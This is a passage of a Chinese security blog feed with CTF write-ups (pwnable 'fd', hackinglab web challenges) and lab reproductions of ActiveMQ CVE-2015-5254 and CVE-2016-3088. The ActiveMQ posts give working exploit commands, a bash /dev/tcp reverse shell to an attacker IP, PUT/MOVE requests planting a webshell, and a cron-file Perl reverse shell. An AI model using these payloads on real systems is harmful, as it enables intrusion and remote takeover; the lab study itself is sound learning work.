class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">fd@ubuntu:~$ cat fd.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">char buf[32];</span><br><span class="line">int main(int argc, char* argv[], char* envp[])&#123;</span><br><span class="line">        if(argc&lt;2)&#123;</span><br><span class="line">                printf(&quot;pass argv[1] a number\n&quot;);</span><br><span class="line">                return 0;</span><br><span class="line">        &#125;</span><br><span class="line">        int fd = atoi( argv[1] ) - 0x1234;</span><br><span class="line">        int len = 0;</span><br><span class="line">        len = read(fd, buf, 32);</span><br><span class="line">        if(!strcmp(&quot;LETMEWIN\n&quot;, buf))&#123;</span><br><span class="line">                printf(&quot;good job :)\n&quot;);</span><br><span class="line">                system(&quot;/bin/cat flag&quot;);</span><br><span class="line">                exit(0);</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;learn about Linux file IO\n&quot;);</span><br><span class="line">        return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>对于一个pwn菜鸡来说，各种看不懂，首先接触到的是c的<a href="http://www.runoob.com/cprogramming/c-command-line-arguments.html" target="_blank" rel="noopener">命令行参数</a>，<br>这个很容易学，然后仔细看看代码，找到能输出flag的语句，<br>然后一直往上跟踪，发现当<code>buf</code>等于<code>LETMEWIN\n</code>时，输出flag<br>但是现在怎么控制<code>buf</code>的值是一个问题，找到前面的<code>read函数</code>，能控制<code>buf</code>的值<br>read函数介绍<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> read（）函数</span><br><span class="line"> read(int fd, void *buf, size_t count);</span><br><span class="line">参数：  </span><br><span class="line">fd： 将要读取数据的文件描述词。</span><br><span class="line">buf：指缓冲区，即读取的数据会被放到这个缓冲区中去。</span><br><span class="line">count： 表示调用一次read操作，应该读多少数量的字符。</span><br></pre></td></tr></table></figure></p><p>先来解释一下<a href="https://www.kancloud.cn/kancloud/understanding-linux-processes/52168" target="_blank" rel="noopener">linux下的文件修饰符</a>,简单来说就是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0 输入 stdin</span><br><span class="line">1 输出 stdout</span><br><span class="line">2 错误 stderr</span><br></pre></td></tr></table></figure></p><p>我们需要的是fd为0，使其可以输入<code>LETMEWIN</code>放到buf里，<br>然后再往上看到<code>fd</code>，决定<code>fd</code>值的是我们传入的<code>argv[]</code>，到这就很简单了，<br>将argv[1]的值传入为0x1234，也就是4660，</p><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><p>很简单，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./fd 4660</span><br><span class="line">然后输出LETMEWIN,回车</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-8-26/41062921.jpg" alt="" title="" class="">                <p></p>            </figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h3&gt;&lt;p&gt;首先连上ssh，&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gut
      
    
    </summary>
    
      <category term="pwn" scheme="http://yoursite.com/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ActiveMQ 反序列化漏洞（CVE-2015-5254）利用</title>
    <link href="http://yoursite.com/2018/08/06/CVE-2015-5254/"/>
    <id>http://yoursite.com/2018/08/06/CVE-2015-5254/</id>
    <published>2018-08-06T06:58:00.000Z</published>
    <updated>2018-10-18T08:34:06.676Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>这里采用<a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">Vulhub漏洞靶场</a>直接一键搭建</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先粘上给出的文档:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">漏洞利用过程如下：</span><br><span class="line"></span><br><span class="line">- 构造（可以使用ysoserial）可执行命令的序列化对象</span><br><span class="line">- 作为一个消息，发送给目标61616端口</span><br><span class="line">- 访问web管理页面，读取消息，触发漏洞</span><br></pre></td></tr></table></figure></p><p>先介绍一下<code>ysoserial</code>,ysoserial是一个Java反序列化工具框架，它包含常见的Java反序列化类型，<br>可以生成一些payload，这里使用<a href="https://github.com/matthiaskaiser/jmet" target="_blank" rel="noopener">jmet</a>,jmet自带ysoserial；</p><p>先访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://靶机IP:8161</span><br></pre></td></tr></table></figure></p><p>确保环境搭建成功了，然后开始漏洞的利用<br>在攻击机上下载好工具<code>jmet</code>，并且安装java环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar</span><br><span class="line">yum -y install java</span><br></pre></td></tr></table></figure></p><p>执行下列语句:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/success&quot; -Yp ROME 靶机IP 61616</span><br></pre></td></tr></table></figure><p>执行成功之后，此时会给目标ActiveMQ添加一个名为event的队列，</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-8-6/7836736.jpg" alt="" title="" class="">                <p></p>            </figure><p>我们可以通过访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://靶机IP:8161/admin/browse.jsp?JMSDestination=event</span><br></pre></td></tr></table></figure></p><p>可以看到有一个消息，当管理员点击此消息时会触发刚刚的<code>touch /tmp/success</code>，<br>我们可以在docker环境里看到这个文件，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it （dockerid） /bin/sh</span><br><span class="line">ls /tmp/</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-8-6/96747315.jpg" alt="" title="" class="">                <p></p>            </figure><p>可以看到已经成功的创建了success，可以执行命令，所以下一步我们直接反弹一个shell，<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/攻击机IP/8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p><p>这里需要一些小技巧来绕过java的机制，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;echo,payload的basse64编码&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p>攻击机监听8888端口，然后访问刚刚在消息队列里的消息，<br>即可得到shell</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-8-6/81458915.jpg" alt="" title="" class="">                <p></p>            </figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h2&gt;&lt;p&gt;这里采用&lt;a href=&quot;https://github.com/vulhub/vulhub&quot; target=&quot;_blank&quot;
      
    
    </summary>
    
      <category term="CVE" scheme="http://yoursite.com/categories/CVE/"/>
    
    
      <category term="命令执行" scheme="http://yoursite.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="漏洞利用" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>ActiveMQ任意文件写入漏洞（CVE-2016-3088）利用</title>
    <link href="http://yoursite.com/2018/08/05/CVE-2016-3088/"/>
    <id>http://yoursite.com/2018/08/05/CVE-2016-3088/</id>
    <published>2018-08-05T09:06:12.000Z</published>
    <updated>2018-10-18T08:34:29.458Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>这里采用<a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">Vulhub漏洞靶场</a>直接一键搭建</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这个漏洞在<code>fileserver</code>应用中，这里介绍一下ActiveMQweb控制台的三个应用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">admin:管理员页面，对后台进行一系列的操作，需要登录</span><br><span class="line">api:普通的接口，同样需要登录</span><br><span class="line">fileserver:储存文件的接口，可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，</span><br><span class="line">其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但是随后发现：</span><br><span class="line">1.其使用率并不高</span><br><span class="line">2.文件操作容易出现漏洞</span><br><span class="line">所以ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。</span><br><span class="line">(转自docker文档)</span><br></pre></td></tr></table></figure></p><p>所以，<code>漏洞是基于版本的</code>，这里的版本支持<code>fileserver</code>，<br>因为<code>fileserver</code>不仅支持写入文件，还支持移动文件；<br>这个时候我们就能利用这个漏洞了，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">首先写入一个文件，随后使用移动文件的请求将文件移动到任意位置，</span><br><span class="line">造成任意文件写入漏洞。文件写入有如下方法可以利用：</span><br><span class="line">1.写入webshell</span><br><span class="line">2.写入cron或ssh key等文件</span><br><span class="line">3.写入jar或jetty.xml等库和配置文件</span><br></pre></td></tr></table></figure></p><p>分析一下这三种方法</p><h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><p>首先写入<code>webshell</code>，访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:/IP:8161/fileserver/</span><br></pre></td></tr></table></figure></p><p>确保fileserver是开启的，</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-8-5/84763907.jpg" alt="" title="" class="">                <p></p>            </figure><p>虽然是开启的，但是fileserver是不会解析jsp的，所以需要移动到能够解析jsp的目录下，<br>比如说刚刚的提到的<code>api</code>应用目录,但需要知道<code>activemq</code>的绝对路径，<br>所以这种方法比较鸡肋，但是胜在简单，先登录上后台,<br>默认用户名密码均是<code>admin</code>,在:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://IP:8161/test/systemProperties.jsp</span><br></pre></td></tr></table></figure></p><p>可以看到在<code>opt/activemq/</code>下</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-8-5/91652444.jpg" alt="" title="" class="">                <p></p>            </figure><p>然后接下来就比较简单了，利用<code>burpsuite</code>来上传webshell，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PUT /fileserver/webshell.txt HTTP/1.1</span><br><span class="line">Host: IP:8161</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">If-Modified-Since: Fri, 13 Feb 2015 17:54:40 GMT</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">webshell</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-8-5/98344161.jpg" alt="" title="" class="">                <p></p>            </figure><p>当返回204的时候证明已经上传成功了。<br>接下来一步是利用MOVE命令来移动到api目录下解析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MOVE /fileserver/webshell.txt HTTP/1.1</span><br><span class="line">Destination: file:///opt/activemq/webapps/api/webshell.jsp</span><br><span class="line">Host: IP:8161</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">If-Modified-Since: Fri, 13 Feb 2015 17:54:40 GMT</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-8-5/11155582.jpg" alt="" title="" class="">                <p></p>            </figure><p>同样的，返回204就证明已经成功了。<br>接下来可以直接访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://IP:8161/api/webshell.jsp</span><br></pre></td></tr></table></figure></p><p>可以看到已经成功解析了:</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-8-5/13381026.jpg" alt="" title="" class="">                <p></p>            </figure><p>总结一下，这种方法需要先登录后台，并且需要知道目录结构，所以比较鸡肋</p><h3 id="写入cron或ssh-key等文件"><a href="#写入cron或ssh-key等文件" class="headerlink" title="写入cron或ssh key等文件"></a>写入cron或ssh key等文件</h3><p>同样的方法上传:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PUT /fileserver/3.txt HTTP/1.1</span><br><span class="line">Host: IP:8161</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">If-Modified-Since: Fri, 13 Feb 2015 17:54:40 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line">*/1 * * * * root /usr/bin/perl -e &apos;use Socket;$i=&quot;攻击IP&quot;;$p=端口;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</span><br><span class="line">##</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-8-5/72108241.jpg" alt="" title="" class="">                <p></p>            </figure><p>然后使用MOVE指令移动到<code>/etc/cron.d</code>目录下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MOVE /fileserver/3.txtHTTP/1.1</span><br><span class="line">Destination: file:///etc/cron.d/root</span><br><span class="line">Host: IP:8161</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">If-Modified-Since: Fri, 13 Feb 2015 17:54:40 GMT</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-8-5/95778592.jpg" alt="" title="" class="">                <p></p>            </figure><p>同样的道理，都返回204就证明成功了，同时攻击机上应该监听端口，等待cron.d执行即可，</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-8-5/45045603.jpg" alt="" title="" class="">                <p></p>            </figure><h3 id="写入jetty-xml或jar"><a href="#写入jetty-xml或jar" class="headerlink" title="写入jetty.xml或jar"></a>写入jetty.xml或jar</h3><p>暂时不会，有时间补上，文档是这样给出来的:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">理论上我们可以覆盖jetty.xml，将admin和api的登录限制去掉，然后再写入webshell。</span><br><span class="line"></span><br><span class="line">有的情况下jetty.xml和jar等所有人是web容器的用户，所以相比起来，写入crontab成功率更高一点。</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h2&gt;&lt;p&gt;这里采用&lt;a href=&quot;https://github.com/vulhub/vulhub&quot; target=&quot;_blank&quot;
      
    
    </summary>
    
      <category term="CVE" scheme="http://yoursite.com/categories/CVE/"/>
    
    
      <category term="漏洞利用" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
      <category term="任意文件写入" scheme="http://yoursite.com/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/"/>
    
      <category term="反弹shell" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%BC%B9shell/"/>
    
  </entry>
  
  <entry>
    <title>hackinglab网络安全实验室writeup</title>
    <link href="http://yoursite.com/2018/07/13/hackinglab/"/>
    <id>http://yoursite.com/2018/07/13/hackinglab/</id>
    <published>2018-07-13T10:15:59.000Z</published>
    <updated>2018-07-30T04:58:46.595Z</updated>
    
    <content type="html"><![CDATA[<p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=1296583188&auto=0&height=32"></iframe></p><h3 id="基础关"><a href="#基础关" class="headerlink" title="基础关"></a>基础关</h3><h4 id="key在哪里"><a href="#key在哪里" class="headerlink" title="key在哪里?"></a>key在哪里?</h4><p>查看源代码，直接找到flag</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/9556473.jpg" alt="" title="" class="">                <p></p>            </figure><h4 id="再加密一次你就得到key啦"><a href="#再加密一次你就得到key啦" class="headerlink" title="再加密一次你就得到key啦~"></a>再加密一次你就得到key啦~</h4><p>给出的提示是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">加密之后的数据为xrlvf23xfqwsxsqf</span><br></pre></td></tr></table></figure></p><p>凯撒加密<br>移了13位，<a href="http://ctf.ssleye.com/caesar.html" target="_blank" rel="noopener">在线加密</a>选择移位<code>13</code>即可得到<code>key</code></p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/47606007.jpg" alt="" title="" class="">                <p></p>            </figure><h4 id="猜猜这是经过了多少次加密？"><a href="#猜猜这是经过了多少次加密？" class="headerlink" title="猜猜这是经过了多少次加密？"></a>猜猜这是经过了多少次加密？</h4><p>一看就是<code>base64</code>，一直base64解码即可拿到key</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/40593997.jpg" alt="" title="" class="">                <p></p>            </figure><h4 id="据说MD5加密很安全，真的是么？"><a href="#据说MD5加密很安全，真的是么？" class="headerlink" title="据说MD5加密很安全，真的是么？"></a>据说MD5加密很安全，真的是么？</h4><p><a href="http://www.somd5.com/" target="_blank" rel="noopener">md5解密</a></p><p>直接得到key</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/58077638.jpg" alt="" title="" class="">                <p></p>            </figure><h4 id="种族歧视"><a href="#种族歧视" class="headerlink" title="种族歧视"></a>种族歧视</h4><p>打开之后提示<code>only for Foreigner</code></p><p>拿bp抓个包，将<code>Accept-Language:</code>这一栏的内容删掉即可</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/77260861.jpg" alt="" title="" class="">                <p></p>            </figure><h4 id="HAHA浏览器"><a href="#HAHA浏览器" class="headerlink" title="HAHA浏览器"></a>HAHA浏览器</h4><p>Hint:<br>据说信息安全小组最近出了一款新的浏览器，叫HAHA浏览器，有些题目必须通过HAHA浏览器才能答对。小明同学坚决不要装HAHA浏览器，怕有后门，但是如何才能过这个需要安装HAHA浏览器才能过的题目呢？<br>估计是改<code>user-agent</code><br>抓包,只要<code>user-agent</code>里出现<code>HAHA</code>即可得到key</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/25075365.jpg" alt="" title="" class="">                <p></p>            </figure><h4 id="key究竟在哪里呢？"><a href="#key究竟在哪里呢？" class="headerlink" title="key究竟在哪里呢？"></a>key究竟在哪里呢？</h4><p>访问后提示：Key就在这里，猜猜这里是哪里呢？(Web找key加强版)<br>抓个包，查看之后发现在响应头里：</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/44802568.jpg" alt="" title="" class="">                <p></p>            </figure><h4 id="key又找不到了"><a href="#key又找不到了" class="headerlink" title="key又找不到了"></a>key又找不到了</h4><p>照常抓包，发现一个<code>key_is_here_now_.php</code>,估计是个<code>302跳转</code>，用<code>bp</code>访问一下，即可得到key</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/52715712.jpg" alt="" title="" class="">                <p></p>            </figure><h4 id="冒充登陆用户"><a href="#冒充登陆用户" class="headerlink" title="冒充登陆用户"></a>冒充登陆用户</h4><p>访问后提示：<code>您还没有登陆呢！</code><br>抓包后发现<code>cookie</code>中有一个<code>login=0</code>的参数，改为<code>1</code>即可得到key</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/72734267.jpg" alt="" title="" class="">                <p></p>            </figure><h4 id="比较数字大小"><a href="#比较数字大小" class="headerlink" title="比较数字大小"></a>比较数字大小</h4><p>题目给了一个输入框，但是限制了长度，同样的，抓包，把<code>v</code>的值网大传，即可得到flag</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/62716700.jpg" alt="" title="" class="">                <p></p>            </figure><h4 id="本地的诱惑"><a href="#本地的诱惑" class="headerlink" title="本地的诱惑"></a>本地的诱惑</h4><p>题目坏了，但是这题的解题方法就是XFF，在发送包中添加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1</span><br></pre></td></tr></table></figure></p><p>即可得到key</p><h4 id="就不让你访问"><a href="#就不让你访问" class="headerlink" title="就不让你访问"></a>就不让你访问</h4><p>题目提示：小明设计了一个网站，因为总是遭受黑客攻击后台，所以这次他把后台放到了一个无论是什么人都找不到的地方….可最后还是被黑客找到了，并被放置了一个黑页，写到:find you ,no more than 3 secs!</p><p>直接扫估计是不行的，试试<code>robots</code>，还真有<br>内容是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /</span><br><span class="line">Crawl-delay: 120</span><br><span class="line">Disallow: /9fb97531fe95594603aff7e794ab2f5f/</span><br><span class="line">Sitemap: http://www.hackinglab.sinaapp.com/sitemap.xml</span><br></pre></td></tr></table></figure></p><p>访问<code>/9fb97531fe95594603aff7e794ab2f5f/</code>,提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you find me,but I am not the login page. keep search.</span><br></pre></td></tr></table></figure></p><p>提示在<code>login page</code>，直接访问<code>login.php</code>，得到key</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/89095162.jpg" alt="" title="" class="">                <p></p>            </figure><h3 id="脚本关"><a href="#脚本关" class="headerlink" title="脚本关"></a>脚本关</h3><h4 id="key又又找不到了"><a href="#key又又找不到了" class="headerlink" title="key又又找不到了"></a>key又又找不到了</h4><p>也是抓包，但是直接看到key了…不清楚原因</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/75077819.jpg" alt="" title="" class="">                <p></p>            </figure><h4 id="快速口算"><a href="#快速口算" class="headerlink" title="快速口算"></a>快速口算</h4><p>请在2秒内口算结果并提交！</p><p>在2s内算出来机会不大，所以需要写脚本了，附上py脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import re </span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()  </span><br><span class="line">url = &apos;http://1.hacklist.sinaapp.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php&apos;</span><br><span class="line">r = s.get(url)</span><br><span class="line">num = re.findall(re.compile(r&apos;&lt;br/&gt;\s+(.*)=&lt;input&apos;), r.text)[0]  #正则匹配，可以先看看源代码</span><br><span class="line">r = s.post(url, data=&#123;&apos;v&apos;: eval(num)&#125;)  #计算表达式的值，并将结果提交  抓包可看出要用v提交</span><br><span class="line">print (r.text)  #输出结果</span><br></pre></td></tr></table></figure><p>运行后得到key</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/66300172.jpg" alt="" title="" class="">                <p></p>            </figure><h4 id="这个题目是空的"><a href="#这个题目是空的" class="headerlink" title="这个题目是空的"></a>这个题目是空的</h4><p>这题有点坑，答案就是<code>null</code>小写</p><h4 id="怎么就是不弹出key呢？"><a href="#怎么就是不弹出key呢？" class="headerlink" title="怎么就是不弹出key呢？"></a>怎么就是不弹出key呢？</h4><p>点了几次不行之后，看看源代码：</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/34069482.jpg" alt="" title="" class="">                <p></p>            </figure><p>可以看到各种<code>return false</code>，但是既然是js的代码，我们就可以在本地搭建<br>将代码复制到本地，然后把前面三个<code>return false</code>的函数干掉</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/55634205.jpg" alt="" title="" class="">                <p></p>            </figure><p>然后本地访问就行了</p><figure class="image-box">                <img 